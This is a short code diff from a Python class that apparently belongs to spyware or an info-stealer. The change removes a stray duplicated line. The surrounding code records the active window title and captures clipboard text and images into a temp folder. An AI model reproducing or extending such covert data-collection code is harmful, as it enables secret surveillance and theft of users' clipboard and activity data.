@@ -902,7 +902,7 @@ class QuicaxdExela:
                     x.write(str(active_window_title))
             if 5 > 4:
                 self.get_last_clipboard_text(run)
-                self.get_last_clipboard_image(run)        x.write(str(active_window_title))
+                self.get_last_clipboard_image(run)        
             
         else:
             os.mkdir(tmp + f"\\{run}")
